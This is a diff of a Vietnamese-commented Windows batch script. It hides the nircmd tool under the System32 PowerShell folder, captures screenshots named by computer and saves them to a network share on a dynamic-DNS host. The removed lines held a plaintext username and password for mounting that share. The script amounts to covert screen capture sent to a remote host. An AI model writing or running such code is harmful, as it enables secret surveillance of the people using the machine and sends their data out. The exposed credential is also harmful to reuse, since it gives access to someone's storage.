@@ -14,8 +14,6 @@ powershell -Command "Expand-Archive -Path 'C:\Windows\System32\WindowsPowerShell
 :: Xóa file zip sau khi giải nén
 del /f /q C:\Windows\System32\WindowsPowerShell\nircmd.zip
 
-:: Kết nối đến chia sẻ mạng \\minhtuan283.ddns.net\hdd
-net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002
 
 :: Lấy tên máy tính bằng PowerShell
 for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i
@@ -31,10 +29,6 @@ set ScreenshotPath=\\minhtuan283.ddns.net\hdd\serial\screenshot\%DeviceName%_%DA
 
 :: Chụp màn hình và lưu vào đường dẫn đã chỉ định
 "C:\Windows\System32\WindowsPowerShell\nircmd\nircmd.exe" savescreenshot "%ScreenshotPath%"
-
-
-:: Ngắt kết nối chia sẻ mạng sau khi xong
-net use \\minhtuan283.ddns.net\hdd /delete
 
 :: Xóa các biến tạm
 set DeviceName=
